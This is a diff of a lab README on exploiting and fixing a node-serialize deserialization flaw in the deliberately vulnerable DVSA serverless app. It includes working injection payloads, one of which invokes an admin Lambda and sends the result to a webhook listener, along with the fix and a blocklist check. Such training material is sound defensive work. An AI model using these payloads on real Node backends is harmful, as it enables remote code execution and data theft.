@@ -1,15 +1,28 @@
 # Lesson 3: Sensitive Information Disclosure (Code Injection)
 
+## How to Use This Folder
+
+1. Read this README from top to bottom.
+2. Use the files in `payloads/` to copy clean request bodies for Postman.
+3. Use the files in `snippets/` to document the vulnerable code pattern, the secure parsing fix, and optional `curl` reproduction commands.
+4. Compare your results with the screenshots in `evidence/`.
+5. Apply the fix in `DVSA-ORDER-MANAGER`, then repeat the verification step to confirm that injected code no longer executes.
+
+> Do not commit real tokens, webhook IDs, or live credentials. Use placeholders in payload files and redact sensitive values in screenshots before pushing to GitHub.
+
+---
+
 ## 1. Vulnerability Summary
 
 This lesson demonstrates a **Sensitive Information Disclosure** vulnerability caused by unsafe deserialization in the DVSA order processing system.
 
-By injecting malicious JavaScript into the `action` field of an API request, an attacker can execute arbitrary code inside the AWS Lambda function, causing:
-- Remote code execution (RCE) inside the Lambda environment
-- Unauthorized outbound HTTP requests from the backend
-- Potential exposure of sensitive data stored in Amazon S3
+By injecting malicious JavaScript into the `action` field of an API request, an attacker can execute arbitrary code inside the AWS Lambda function. This can cause:
 
-The affected component is the `DVSA-ORDER-MANAGER` Lambda function, reachable through the `POST /Stage/order` API Gateway endpoint. The root weakness is that user input is passed directly into an unsafe deserialization function (`node-serialize`) which reconstructs and executes embedded JavaScript functions.
+- Remote code execution inside the Lambda runtime
+- Unauthorized outbound HTTP requests from the backend
+- Potential exposure of sensitive data stored in backend services such as Amazon S3
+
+The affected component is the `DVSA-ORDER-MANAGER` Lambda function, reachable through the `POST /Stage/order` API Gateway endpoint. The root weakness is that user input is passed directly into `node-serialize`, which can reconstruct and execute embedded JavaScript functions.
 
 ---
 
@@ -17,13 +30,15 @@ The affected component is the `DVSA-ORDER-MANAGER` Lambda function, reachable th
 
 The vulnerability exists because of three combined failures:
 
-- **Unsafe deserialization** — the `node-serialize` library reconstructs and executes any JavaScript function embedded in the `_$$ND_FUNC$$_` format without restriction
-- **No input validation** — the `action` field is accepted as-is without checking its type or content
-- **No authorization checks** — privileged backend operations can be triggered directly from user-controlled input
+- **Unsafe deserialization** — the `node-serialize` library reconstructs JavaScript functions embedded in the `_$$ND_FUNC$$_` format.
+- **No input validation** — the `action` field is accepted as-is without checking its type or content.
+- **Weak backend protection** — privileged backend behavior can be influenced by user-controlled input.
 
 ### Why the attack works
 
-The `node-serialize` library was designed for serializing objects that include functions. When it encounters the `_$$ND_FUNC$$_` prefix in a string, it wraps the value in a JavaScript `eval()` call. Since this happens inside the Lambda execution environment, the injected code runs with the same IAM permissions as the function itself.
+The `node-serialize` library was designed to serialize objects that may include functions. When it finds the `_$$ND_FUNC$$_` marker, it treats the value as JavaScript code. If the function is invoked with `()`, the code runs during deserialization before normal application logic finishes.
+
+Because this happens inside the Lambda execution environment, the injected code runs with the same runtime context and IAM permissions available to the function.
 
 ---
 
@@ -36,8 +51,8 @@ The `node-serialize` library was designed for serializing objects that include f
 | API Endpoint | `POST https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order` |
 | Lambda Function | `DVSA-ORDER-MANAGER` |
 | CloudWatch Log Group | `/aws/lambda/DVSA-ORDER-MANAGER` |
-| AWS Services | API Gateway, AWS Lambda, Amazon S3 |
-| Tools Used | Postman, Browser DevTools (Chrome), webhook.site, AWS CloudWatch |
+| AWS Services | API Gateway, AWS Lambda, Amazon S3, CloudWatch Logs |
+| Tools Used | Postman, Browser DevTools, webhook.site, AWS CloudWatch |
 
 ---
 
@@ -45,10 +60,13 @@ The `node-serialize` library was designed for serializing objects that include f
 
 Before starting:
 
-1. Have access to the DVSA application with a valid user account
-2. Have Postman installed
-3. Generate a unique listener URL at [webhook.site](https://webhook.site) — keep this tab open
-4. Have access to CloudWatch Logs in the AWS Console
+1. Have access to the DVSA application with a valid user account.
+2. Have Postman installed.
+3. Open webhook.site and generate a unique listener URL.
+4. Have access to CloudWatch Logs in the AWS Console.
+5. Know your API Gateway endpoint for the order API.
+
+Estimated time to reproduce: 10–15 minutes after the endpoint, token, and webhook URL are ready.
 
 ---
 
@@ -56,38 +74,42 @@ Before starting:
 
 ### Step 1: Create a Normal Order
 
-1. Open the DVSA application in your browser
-2. Add any product to the cart
-3. Proceed to checkout to generate a valid session
+1. Open the DVSA application in your browser.
+2. Add any product to the cart.
+3. Proceed to checkout or perform an order-related action to generate a valid authenticated session.
 
 ---
 
 ### Step 2: Capture the API Request
 
-1. Open Chrome DevTools (`F12`) → **Network** tab
-2. Perform a checkout action
-3. Find the `POST /Stage/order` request
+1. Open Chrome DevTools (`F12`) → **Network** tab.
+2. Perform an order-related request.
+3. Find the `POST /Stage/order` request.
 4. Copy:
    - The full API endpoint URL
-   - The `Authorization` header value (your JWT token)
+   - The `Authorization` header value
    - The request body structure
+
+Save the endpoint and token locally. Do not commit them to GitHub.
 
 ---
 
 ### Step 3: Test a Normal Request in Postman
 
-Verify the endpoint is reachable before injecting anything.
+First, verify that the endpoint is reachable before injecting anything.
 
 **Method:** `POST`  
 **URL:** `https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order`
 
 **Headers:**
-```
+
+```text
 Authorization: <your_token>
 Content-Type: application/json
 ```
 
 **Body:**
+
 ```json
 {
   "action": "get_cart",
@@ -95,37 +117,48 @@ Content-Type: application/json
 }
 ```
 
-Confirm you receive a normal response before proceeding.
+The same request body is stored in:
+
+```text
+payloads/normal_get_cart_request.json
+```
+
+Confirm that the backend responds normally before continuing.
 
 ---
 
-### Step 4: Send the Code Injection Payload (RCE Test)
+### Step 4: Send the Code Injection Payload
 
-Go to [webhook.site](https://webhook.site) and copy your unique URL. Then send the following payload in Postman:
+Go to webhook.site and copy your unique listener URL. Then send this payload in Postman:
 
 ```json
 {
-  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<your-webhook-id>?test=hello')}",
+  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<your-webhook-url>?test=hello')}()",
   "cart_id": "test"
 }
 ```
 
-Replace `<your-webhook-id>` with your actual webhook.site URL.
+The same payload template is stored in:
 
-Click **Send**.
+```text
+payloads/rce_webhook_test_payload.json
+```
+
+Replace `<your-webhook-url>` with your real webhook.site URL before sending.
 
 ---
 
 ### Step 5: Observe Code Execution on Webhook
 
-Switch to your webhook.site tab.
+Switch to the webhook.site tab.
 
-**Expected result:**
-- An incoming `GET` request appears
-- Query string: `test=hello`
-- Source IP originates from AWS infrastructure (Virginia / `us-east-1`)
+Expected result:
 
-This confirms the injected JavaScript was executed inside the Lambda function and made a live outbound HTTP request.
+- An incoming `GET` request appears.
+- The query string contains `test=hello`.
+- The source location/IP indicates that the request came from AWS infrastructure.
+
+This confirms that injected JavaScript executed inside the Lambda function and made a live outbound request.
 
 **Evidence:**
 
@@ -133,28 +166,33 @@ This confirms the injected JavaScript was executed inside the Lambda function an
 
 ---
 
-### Step 6: Attempt Privilege Escalation
+### Step 6: Attempt Privileged Backend Invocation
 
-Now send an advanced payload that tries to load the `aws-sdk` and invoke a privileged Lambda function (`DVSA-ADMIN-GET-RECEIPT`):
+Next, send an advanced payload that tries to load `aws-sdk` and invoke a privileged Lambda function named `DVSA-ADMIN-GET-RECEIPT`.
 
 ```json
 {
-  "action": "_$$ND_FUNC$$_function(){var aws=require('aws-sdk');var lambda=new aws.Lambda();var p={FunctionName:'DVSA-ADMIN-GET-RECEIPT',InvocationType:'RequestResponse',Payload:JSON.stringify({'year':'2018','month':'12'})};lambda.invoke(p).promise().then(function(d){var h=require('http');h.get('http://<your-webhook-id>?data='+encodeURIComponent(JSON.stringify(d)));});}()",
+  "action": "_$$ND_FUNC$$_function(){var aws=require('aws-sdk');var lambda=new aws.Lambda();var p={FunctionName:'DVSA-ADMIN-GET-RECEIPT',InvocationType:'RequestResponse',Payload:JSON.stringify({'year':'2018','month':'12'})};lambda.invoke(p).promise().then(function(d){var h=require('http');h.get('http://<your-webhook-url>?data='+encodeURIComponent(JSON.stringify(d)));});}()",
   "cart_id": "test"
 }
 ```
 
-Click **Send**.
+The same payload template is stored in:
+
+```text
+payloads/advanced_admin_receipt_payload.json
+```
 
 ---
 
 ### Step 7: Observe the Backend Response
 
-**Expected result:**
-- API returns `502 Bad Gateway` or `500 Internal Server Error`
-- Response body: `{"message": "Internal server error"}`
+Expected result:
 
-This shows the payload reached the Lambda backend and attempted to execute privileged logic, but failed due to a missing dependency in the runtime.
+- API returns `502 Bad Gateway` or `500 Internal Server Error`.
+- Response body shows a generic internal server error.
+
+This does not mean the payload failed. It means the injected code reached the backend and attempted to execute privileged logic, but the runtime could not load the dependency.
 
 **Evidence:**
 
@@ -164,25 +202,21 @@ This shows the payload reached the Lambda backend and attempted to execute privi
 
 ### Step 8: Check CloudWatch Logs for Execution Proof
 
-In the AWS Console, go to:
+Go to:
 
-**CloudWatch → Log Groups → `/aws/lambda/DVSA-ORDER-MANAGER`**
-
-Look for the latest log stream. You should see:
-
-```
-ERROR Invoke Error
-{
-  "errorType": "Error",
-  "errorMessage": "Cannot find module 'aws-sdk'",
-  ...
-  "stack": [
-    "at eval (/.../node-serialize/lib/serialize.js:75:22)"
-  ]
-}
+```text
+AWS Console → CloudWatch → Log Groups → /aws/lambda/DVSA-ORDER-MANAGER
 ```
 
-The stack trace confirms the code was evaluated by `node-serialize` and ran inside the Lambda environment before failing.
+Open the latest log stream and look for the `aws-sdk` error.
+
+Expected evidence:
+
+```text
+Cannot find module 'aws-sdk'
+```
+
+The stack trace shows execution passing through `node-serialize`, proving that the injected code was evaluated inside the Lambda environment.
 
 **Evidence:**
 
@@ -192,19 +226,16 @@ The stack trace confirms the code was evaluated by `node-serialize` and ran insi
 
 ### Step 9: Confirm Outbound Communication Attempt
 
-In the same CloudWatch log group, look for an earlier log entry. You should see:
+In CloudWatch, check the earlier log entry related to `webhook.site`.
 
-```
-ERROR Uncaught Exception
-{
-  "errorType": "Error",
-  "errorMessage": "Client network socket disconnected before secure TLS connection was established",
-  "code": "ECONNRESET",
-  "host": "webhook.site"
-}
+Expected evidence:
+
+```text
+ECONNRESET
+host: webhook.site
 ```
 
-This confirms the Lambda function attempted to reach `webhook.site` — the injected code triggered a real outbound network connection from the backend.
+This confirms that the Lambda function attempted an outbound network connection because of attacker-controlled input.
 
 **Evidence:**
 
@@ -216,79 +247,90 @@ This confirms the Lambda function attempted to reach `webhook.site` — the inje
 
 | What was attempted | Result |
 |---|---|
-| Outbound HTTP request via `require('http')` | Succeeded — webhook received the request |
-| Load `aws-sdk` and invoke admin Lambda | Failed — `aws-sdk` not available in runtime |
-| Outbound communication capability | Confirmed — ECONNRESET in CloudWatch |
+| Outbound HTTP request to webhook.site | Succeeded — webhook received the request |
+| Load `aws-sdk` and invoke admin Lambda | Failed because `aws-sdk` was unavailable in the runtime |
+| Outbound communication from backend | Confirmed in CloudWatch |
+| Code execution inside Lambda | Confirmed through webhook and CloudWatch evidence |
 
-Code execution inside Lambda is confirmed. Full data exfiltration was limited by the runtime environment, but the attack surface is real.
+Full data exfiltration was limited by the runtime environment, but the attack surface is real because arbitrary code execution was confirmed.
 
 ---
 
 ## 7. Fix Strategy
 
-The fix must be applied inside the `DVSA-ORDER-MANAGER` Lambda function:
+The fix must be applied inside `DVSA-ORDER-MANAGER`:
 
-- **Replace unsafe deserialization** — remove `node-serialize` and use `JSON.parse()` instead
-- **Validate input types** — reject any input where `action` is not a plain string
-- **Block function payloads** — explicitly reject any value containing `_$$ND_FUNC$$_`
-- **Add authorization checks** — ensure privileged operations cannot be triggered by unauthenticated or unprivileged input
-- **Apply least-privilege IAM** — restrict the Lambda execution role to only the permissions it actually needs
+- **Remove unsafe deserialization** — do not use `node-serialize` on user-controlled input.
+- **Use `JSON.parse()`** — parse request bodies as data only.
+- **Validate input types** — reject requests where `action` is missing or not a string.
+- **Reject function payload markers** — block values containing `_$$ND_FUNC$$_`.
+- **Protect privileged actions** — sensitive backend functions must require explicit authorization.
+- **Apply least privilege** — the Lambda role should only have the permissions required for normal order handling.
 
 ---
 
 ## 8. Code / Config Changes
 
-**Location:** Lambda function `DVSA-ORDER-MANAGER` — input handling logic
+**Location:** `DVSA-ORDER-MANAGER` Lambda function input handling logic.
 
-**Before:**
+### Before: vulnerable deserialization
 
 ```javascript
 const serialize = require('node-serialize');
 let obj = serialize.unserialize(userInput);
 ```
 
-**After:**
+This vulnerable snippet is stored in:
+
+```text
+snippets/vulnerable_deserialization_snippet.js
+```
+
+### After: safe parsing and validation
 
 ```javascript
 let obj = JSON.parse(userInput);
-```
 
-**Additional validation added:**
-
-```javascript
-if (typeof obj.action !== 'string' || obj.action.includes('_$$ND_FUNC$$_')) {
+if (typeof obj.action !== "string" || obj.action.includes("_$$ND_FUNC$$_")) {
     throw new Error("Invalid input");
 }
 ```
 
-**Summary of all changes:**
-- Removed `node-serialize` dependency entirely
-- Replaced with `JSON.parse()` — treats input as data only, never as executable code
-- Added type check and blocklist check on the `action` field
-- Added authorization checks before invoking any privileged operations
-- Restricted IAM role permissions (removed unnecessary S3 and Lambda invoke access)
+A more complete safe validation example is stored in:
+
+```text
+snippets/safe_parsing_validation_snippet.js
+```
+
+### Summary of changes
+
+- Removed `node-serialize` from the request parsing path.
+- Replaced unsafe deserialization with `JSON.parse()`.
+- Added type validation for the `action` field.
+- Added rejection for function payload markers.
+- Treated privileged backend actions as authorization-protected operations.
 
 ---
 
 ## 9. Verification After Fix
 
-Send the same injection payload again:
+After applying the fix, send the same webhook payload again:
 
 ```json
 {
-  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<your-webhook-id>?test=hello')}",
+  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<your-webhook-url>?test=hello')}()",
   "cart_id": "test"
 }
 ```
 
-**Expected result after fix:**
-- No incoming request appears on webhook.site
-- No code execution visible in CloudWatch
-- API returns a safe error response or processes input normally
+Expected result after fix:
 
-**Normal order flow:**
-- Regular order requests continue to work correctly
-- The fix does not break legitimate functionality
+- No incoming request appears on webhook.site.
+- No injected execution appears in CloudWatch.
+- The API returns a safe error response or rejects the request.
+- Normal order requests continue to work correctly.
+
+The important change is that the payload is now treated as data, not executable code.
 
 ---
 
@@ -296,17 +338,18 @@ Send the same injection payload again:
 
 ### Intended Logic
 
-Under normal conditions, a user submits an order through the frontend. The expected flow:
+Under normal conditions, a user submits an order through the frontend. The expected flow is:
 
-```
-Browser → API Gateway → Lambda (DVSA-ORDER-MANAGER) → DynamoDB (order data)
-                                                      → S3 (receipt storage)
+```text
+Browser → API Gateway → Lambda (DVSA-ORDER-MANAGER) → DynamoDB / S3
+                                                      → CloudWatch Logs
 ```
 
-**Security rules the system must enforce:**
-- User input must never be executed as code
-- No privileged backend function should be triggerable by user input alone
-- No external requests should be initiated as a result of untrusted input
+Security rules the system must enforce:
+
+- User input must never be executed as code.
+- No privileged backend function should be triggered by untrusted input alone.
+- No external requests should be initiated because of attacker-controlled request content.
 
 ---
 
@@ -314,7 +357,7 @@ Browser → API Gateway → Lambda (DVSA-ORDER-MANAGER) → DynamoDB (order data
 
 | Vulnerability | Intended Rule(s) | Artifacts Used | Normal Behavior Evidence | Exploit Behavior Evidence |
 |---|---|---|---|---|
-| Sensitive Information Disclosure (Code Injection) | Input must not be executed as code; no unauthorized backend actions must be triggered by user input | Postman requests, webhook.site logs, CloudWatch logs (`/aws/lambda/DVSA-ORDER-MANAGER`) | Normal order request processed without any external calls or errors | Injected payload triggered outbound request to webhook.site (`step5_webhook_rce.png`); CloudWatch confirms Lambda evaluated the payload (`step8_aws_sdk_error.png`, `step9_econnreset.png`) |
+| Sensitive Information Disclosure / Code Injection | Input must not be executed as code. Backend actions must be controlled by trusted application logic only. | Postman request, webhook.site request, CloudWatch logs, Lambda error stack traces | Normal request is processed without external calls or code execution | Injected payload triggered outbound request to webhook.site and CloudWatch confirmed execution through `node-serialize` |
 
 ---
 
@@ -322,29 +365,38 @@ Browser → API Gateway → Lambda (DVSA-ORDER-MANAGER) → DynamoDB (order data
 
 | Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied | Post-Fix Verification | Latency |
 |---|---|---|---|---|---|
-| Sensitive Information Disclosure (Code Injection) | The system executed user-supplied input as JavaScript code inside the Lambda runtime, violating the rule that input must be treated as data only. This allowed an attacker to force outbound requests and attempt invocation of privileged admin functions. | Intentional Misuse / Security-Relevant Abuse | Removed `node-serialize`; replaced with `JSON.parse()`; added input validation blocking `_$$ND_FUNC$$_` payloads; enforced authorization checks | No webhook request received after fix; no execution visible in CloudWatch; normal orders still processed correctly | Not measured |
+| Sensitive Information Disclosure / Code Injection | The system executed user-supplied input as JavaScript code inside the Lambda runtime, violating the rule that input must be treated strictly as data. | Intentional Misuse / Security-Relevant Abuse | Removed `node-serialize`, replaced it with `JSON.parse()`, added input validation, and protected privileged operations | Same payload no longer executes, no webhook request is received, and no injected execution appears in CloudWatch | Not measured |
 
 ---
 
 ## 11. Lessons Learned
 
-The core mistake was using a library (`node-serialize`) that was designed to serialize executable code, then applying it to user-controlled input. This is a direct violation of the principle that **all user input must be treated as untrusted data**.
+The core mistake was using a library that can reconstruct executable JavaScript functions from user-controlled input. `node-serialize` should never be used to parse untrusted API request bodies.
 
-In a serverless environment, this vulnerability is especially dangerous because there is no traditional server boundary — the Lambda function is directly reachable via a public API endpoint. A single function compromise can expose the function's IAM role, its access to S3, DynamoDB, and other Lambda functions, and the ability to make outbound requests from the cloud environment.
+In serverless environments, this type of issue is especially dangerous because the Lambda function is directly reachable through API Gateway and runs with an IAM execution role. A single code execution bug can become a wider cloud security problem if the function role has access to S3, DynamoDB, or other Lambda functions.
 
-The fix is straightforward: never use deserialization libraries that reconstruct executable functions from user input. Use `JSON.parse()` and validate strictly.
+The main lesson is simple: user input must always be treated as data, never executable code. Safe parsing, strict validation, protected privileged operations, and least-privilege IAM all reduce the chance that a small input-handling bug becomes a full backend compromise.
 
 ---
 
 ## Repository Structure
 
-```
-lesson3_sensitive_data_exposure/
+```text
+lesson3_sensitive_information_disclosure/
 │
-├── README.md                        <- This file
-└── evidence/
-    ├── step5_webhook_rce.png        <- Webhook receives outbound request from Lambda (RCE confirmed)
-    ├── step7_postman_response.png   <- Postman shows 502 Bad Gateway from privileged payload
-    ├── step8_aws_sdk_error.png      <- CloudWatch: Cannot find module 'aws-sdk' (execution confirmed)
-    └── step9_econnreset.png         <- CloudWatch: ECONNRESET to webhook.site (outbound comm confirmed)
+├── README.md
+├── evidence/
+│   ├── step5_webhook_rce.png
+│   ├── step7_postman_response.png
+│   ├── step8_aws_sdk_error.png
+│   └── step9_econnreset.png
+├── payloads/
+│   ├── advanced_admin_receipt_payload.json
+│   ├── normal_get_cart_request.json
+│   ├── postman_headers_template.txt
+│   └── rce_webhook_test_payload.json
+└── snippets/
+    ├── curl_reproduction_template.sh
+    ├── safe_parsing_validation_snippet.js
+    └── vulnerable_deserialization_snippet.js
 ```
